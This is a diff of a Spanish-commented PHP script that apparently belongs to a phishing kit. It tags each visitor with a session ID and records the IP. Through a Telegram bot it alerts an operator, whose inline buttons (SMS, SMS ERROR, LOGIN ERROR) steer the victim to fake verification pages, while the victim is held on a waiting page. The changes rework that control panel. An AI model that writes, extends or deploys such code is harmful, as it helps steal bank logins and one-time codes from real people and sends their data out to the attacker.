@@ -1,9 +1,9 @@
 <?php
 session_start();
 
-// Aseguramos que exista un nombre de usuario único
+// Crear usuario si no existe en sesión
 if (!isset($_SESSION['usuario'])) {
-    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999); // Si no lo envió desde antes, se crea uno
+    $_SESSION['usuario'] = 'cli_' . rand(1000, 9999);
 }
 
 $usuario = $_SESSION['usuario'];
@@ -18,16 +18,16 @@ function obtenerIP() {
 $ip = obtenerIP();
 
 require_once("settings.php");
-// Botones para controlar desde Telegram
+
+// NUEVOS BOTONES válidos
 $keyboard = [
     "inline_keyboard" => [
         [
             ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
-            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"]
+            ["text" => "❌ SMS ERROR", "callback_data" => "SMS-ERROR|$usuario"]
         ],
         [
-            ["text" => "❓ NUMERO", "callback_data" => "NUMERO|$usuario"],
-            ["text" => "📧 SMS ERROR", "callback_data" => "SMSERROR|$usuario"]
+            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$usuario"]
         ]
     ]
 ];
@@ -41,7 +41,6 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build
     "reply_markup" => json_encode($keyboard)
 ]));
 
-// Redirigir al cliente a espera.php
+// Redirigir al cliente
 header("Location: espera.php");
 exit;
-?>
